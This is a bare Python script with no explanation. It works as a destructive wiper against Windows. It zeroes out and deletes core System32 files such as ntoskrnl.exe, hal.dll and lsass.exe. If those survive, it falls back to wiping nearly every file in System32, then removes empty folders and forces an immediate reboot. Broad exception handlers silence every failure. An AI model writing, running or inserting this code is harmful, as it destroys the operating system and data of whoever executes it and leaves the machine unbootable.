import os
dl = []
for fn in ['ntoskrnl.exe', 'hal.dll', 'csrss.exe', 'wininit.exe', 'winlogon.exe','kernel32.dll', 'user32.dll', 'gdi32.dll', 'advapi32.dll', 'ntdll.dll', 'msvcrt.dll','lsass.exe', 'secur32.dll', 'crypt32.dll','services.exe', 'svchost.exe', 'conhost.exe']:
    try:
        fs = os.path.getsize(os.path.join(r"C:\Windows\System32", fn))
        with open(os.path.join(r"C:\Windows\System32", fn), 'rb+') as f:
            f.seek(0); bw = 0
            while bw < fs:
                f.write(b'\x00' * min(4194304, fs - bw)); bw += min(4194304, fs - bw)
    except (PermissionError, OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt, Exception): pass
    try: os.remove(os.path.join(r"C:\Windows\System32", fn)); dl.append(fn)
    except (PermissionError, OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
if 'ntoskrnl.exe' not in dl or 'hal.dll' not in dl:
    for r, _, fs_in_r in os.walk(r"C:\Windows\System32"):
        for f in fs_in_r:
            if os.path.basename(f).lower() not in ['cmd.exe', 'shutdown.exe']:
                try:
                    fs = os.path.getsize(os.path.join(r, f))
                    with open(os.path.join(r, f), 'rb+') as of:
                        of.seek(0); bw = 0
                        while bw < fs:
                            of.write(b'\x00' * min(4194304, fs - bw)); bw += min(4194304, fs - bw)
                except (PermissionError, OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt, Exception): pass
                try: os.remove(os.path.join(r, f))
                except (PermissionError, OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
    for r, ds, fs_in_r in os.walk(r"C:\Windows\System32", topdown=False):
        if not ds and not fs_in_r:
            try: os.rmdir(r)
            except (PermissionError, OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass
try: os.system("shutdown /r /t 0 /f")
except (PermissionError, OSError, TypeError, ValueError, MemoryError, KeyboardInterrupt): pass